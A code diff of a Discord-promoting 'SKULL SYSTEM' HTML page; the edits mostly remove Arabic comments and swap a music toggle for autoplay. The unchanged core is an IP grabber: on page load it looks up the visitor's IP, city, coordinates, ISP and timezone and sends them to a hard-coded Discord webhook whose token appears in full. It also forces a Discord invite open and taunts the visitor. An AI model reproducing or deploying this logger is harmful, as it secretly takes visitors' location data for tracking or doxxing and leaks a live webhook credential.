@@ -32,7 +32,6 @@
             to { opacity: 1; }
         }
 
-        /* طبقة داكنة متحركة */
         body::before {
             content: '';
             position: fixed;
@@ -50,7 +49,6 @@
             50% { background: rgba(0, 0, 0, 0.7); }
         }
 
-        /* الحاوية الرئيسية */
         .container {
             position: relative;
             z-index: 1;
@@ -71,17 +69,10 @@
         }
 
         @keyframes slideUp {
-            from {
-                transform: translateY(50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        /* الصورة */
         .image-container {
             margin-bottom: 25px;
             position: relative;
@@ -108,7 +99,6 @@
             50% { transform: translateY(-8px); }
         }
 
-        /* معلومات IP */
         .info {
             margin: 25px 0;
             font-size: 0.9rem;
@@ -150,10 +140,7 @@
         .info-line:nth-child(7) { animation-delay: 0.7s; }
 
         @keyframes fadeInLine {
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         .info-label {
@@ -169,7 +156,6 @@
             text-shadow: 0 0 3px #ff66cc;
         }
 
-        /* النص الكبير */
         .text {
             margin-top: 25px;
             font-size: 2.2rem;
@@ -197,7 +183,6 @@
             50% { text-shadow: 0 0 25px #ff66cc, 0 0 45px #ff00a2, 0 0 60px #ff00a2; }
         }
 
-        /* زر التحديث */
         .refresh-btn {
             margin-top: 25px;
             background: linear-gradient(135deg, #330022, #110011);
@@ -223,36 +208,6 @@
             border-color: #ffffff;
         }
 
-        /* موسيقى */
-        .music-control {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 100;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 50px;
-            padding: 8px 15px;
-            border: 1px solid #ff00a2;
-            cursor: pointer;
-            transition: 0.3s;
-            color: #ff66cc;
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .music-control:hover {
-            background: #ff00a2;
-            color: #000;
-            box-shadow: 0 0 20px #ff00a2;
-        }
-
-        .music-control span {
-            font-size: 1.2rem;
-        }
-
         @media (max-width: 600px) {
             .container { padding: 20px 18px; margin: 10px; }
             .text { font-size: 1.2rem; letter-spacing: 2px; }
@@ -262,7 +217,6 @@
             .refresh-btn { padding: 6px 18px; font-size: 0.7rem; }
         }
 
-        /* لودر */
         .loader {
             position: fixed;
             top: 0;
@@ -282,121 +236,59 @@
         }
 
         @keyframes loaderFade {
-            to {
-                opacity: 0;
-                visibility: hidden;
-            }
+            to { opacity: 0; visibility: hidden; }
         }
     </style>
 </head>
 <body>
 
-<!-- لودر -->
 <div class="loader" id="loader">
-    <div> SKULL SYSTEM LOADING  ay1 is here everyone here submits.
- </div>
+    <div> SKULL SYSTEM LOADING ay1 is here everyone here submits.</div>
 </div>
 
 <div class="container">
-    <!-- الصورة -->
     <div class="image-container">
         <img src="https://cdn.discordapp.com/attachments/1382828642392084520/1485648179117424770/171a3719bc0f86c4b525e13b4eb41928_1.jpg?ex=69c2a12f&is=69c14faf&hm=8e91cd3c0d5ee8861da55bd1962c319e8c767c4d642bbe8ee2a14532afcd3ee4&" alt="SKULL IMAGE">
     </div>
 
-    <!-- معلومات IP -->
     <div class="info" id="ip-info">
-        <div class="info-line">
-            <span class="info-label">💀 IP SKULL IS HERE:</span>
-            <span class="info-value" id="ip">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">📍 CITY SKULL IS HERE:</span>
-            <span class="info-value" id="city">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">🗺️ REGION SKULL IS HERE:</span>
-            <span class="info-value" id="region">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">🌍 COUNTRY SKULL IS HERE:</span>
-            <span class="info-value" id="country">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">📍 LOCATION SKULL IS HERE:</span>
-            <span class="info-value" id="loc">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">🏢 ORGANIZATION SKULL IS HERE:</span>
-            <span class="info-value" id="org">--</span>
-        </div>
-        <div class="info-line">
-            <span class="info-label">⏰ TIMEZONE SKULL IS HERE:</span>
-            <span class="info-value" id="timezone">--</span>
-        </div>
+        <div class="info-line"><span class="info-label">💀 IP SKULL IS HERE:</span><span class="info-value" id="ip">--</span></div>
+        <div class="info-line"><span class="info-label">📍 CITY SKULL IS HERE:</span><span class="info-value" id="city">--</span></div>
+        <div class="info-line"><span class="info-label">🗺️ REGION SKULL IS HERE:</span><span class="info-value" id="region">--</span></div>
+        <div class="info-line"><span class="info-label">🌍 COUNTRY SKULL IS HERE:</span><span class="info-value" id="country">--</span></div>
+        <div class="info-line"><span class="info-label">📍 LOCATION SKULL IS HERE:</span><span class="info-value" id="loc">--</span></div>
+        <div class="info-line"><span class="info-label">🏢 ORGANIZATION SKULL IS HERE:</span><span class="info-value" id="org">--</span></div>
+        <div class="info-line"><span class="info-label">⏰ TIMEZONE SKULL IS HERE:</span><span class="info-value" id="timezone">--</span></div>
     </div>
 
-    <!-- النص الكبير -->
     <div class="text" onclick="window.open('https://discord.gg/ay1', '_blank')">DISCORD.GG/AY1 SKULL IS HERE</div>
-    
-    <!-- زر تحديث IP -->
     <button class="refresh-btn" onclick="fetchIP()">⟳ REFRESH IP</button>
 </div>
 
-<!-- تحكم بالموسيقى -->
-<div class="music-control" id="musicToggle">
-    <span>🎵</span>
-    <span id="musicStatus">MUSIC ON</span>
-</div>
-
-<!-- الأغنية -->
-<audio id="bgMusic" loop>
+<!-- موسيقى - نسخة واحدة فقط -->
+<audio id="bgMusic" loop autoplay>
     <source src="https://cdn.discordapp.com/attachments/1382828642392084520/1485642773783642195/music.mp3?ex=69c29c27&is=69c14aa7&hm=0b80d03981af9d33d79f89859cc6f2d807ed83f883b9ecd5a6a4f4460322313f&" type="audio/mpeg">
 </audio>
 
 <script>
-    // عناصر الموسيقى
-    const bgMusic = document.getElementById('bgMusic');
-    const musicToggle = document.getElementById('musicToggle');
-    const musicStatus = document.getElementById('musicStatus');
-    let isMusicPlaying = true;
-
     // تشغيل الموسيقى
-    function playMusic() {
-        bgMusic.play().catch(e => {
-            console.log("Autoplay blocked, waiting for interaction");
-            isMusicPlaying = false;
-            musicStatus.textContent = "MUSIC OFF";
-        });
-    }
-
-    // تبديل الموسيقى
-    musicToggle.addEventListener('click', () => {
-        if (isMusicPlaying) {
-            bgMusic.pause();
-            isMusicPlaying = false;
-            musicStatus.textContent = "MUSIC OFF";
-            musicToggle.style.opacity = "0.7";
-        } else {
-            bgMusic.play().catch(e => console.log(e));
-            isMusicPlaying = true;
-            musicStatus.textContent = "MUSIC ON";
-            musicToggle.style.opacity = "1";
-        }
+    const bgMusic = document.getElementById('bgMusic');
+    bgMusic.volume = 0.5;
+    
+    // محاولة تشغيل الموسيقى مباشرة
+    bgMusic.play().catch(e => {
+        console.log("الموسيقى تحتاج تفاعل من المستخدم");
     });
-
-    // تفعيل الموسيقى عند أول تفاعل
-    document.addEventListener('click', function enableMusic() {
-        if (!isMusicPlaying && bgMusic.paused) {
+    
+    // في حال منع المتصفح، تشغل عند أول ضغطة
+    document.addEventListener('click', function musicOnClick() {
+        if (bgMusic.paused) {
             bgMusic.play().catch(e => console.log(e));
-            isMusicPlaying = true;
-            musicStatus.textContent = "MUSIC ON";
         }
-        document.removeEventListener('click', enableMusic);
     });
 
     // جلب معلومات IP
     function fetchIP() {
-        // تأثير عند التحديث
         const refreshBtn = document.querySelector('.refresh-btn');
         refreshBtn.style.transform = "scale(0.95)";
         setTimeout(() => refreshBtn.style.transform = "", 200);
@@ -412,7 +304,6 @@
             document.getElementById('org').textContent = data.org || 'Unknown';
             document.getElementById('timezone').textContent = data.timezone || 'N/A';
             
-            // إرسال إلى webhook
             const webhookUrl = 'https://discord.com/api/webhooks/1386522011072987267/pdRG2l362EO2KJ3TxwRvEO0okTM5PlrU7h2XUYFq1f0RDZWgqHagXdDJskKGFHOtLsKw';
             const dateTime = new Date().toLocaleString();
             
@@ -436,9 +327,7 @@
         });
     }
     
-    // تشغيل عند تحميل الصفحة
     fetchIP();
-    playMusic();
     
     // إخفاء اللودر
     setTimeout(() => {
@@ -449,7 +338,7 @@
     // فتح رابط الديسكورد بعد 3 ثواني
     setTimeout(() => {
         window.open("https://discord.gg/ay1", "_blank");
-    }, 3200);
+    }, 3000);
 </script>
 
 </body>
